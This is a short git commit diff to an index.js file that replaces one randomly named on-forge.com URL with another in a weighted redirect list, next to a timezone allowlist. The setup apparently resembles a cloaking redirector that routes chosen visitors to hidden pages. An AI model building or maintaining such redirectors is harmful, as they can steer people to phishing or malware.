e383c897b7ef4143047d74de1ed06f022ea4d498
paalakash <palaksh452@gmail.com>
2026-06-28 06:22:23 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://ershdjdsbjddf.on-forge.com/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://sudfgyusdgsd.on-forge.com/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
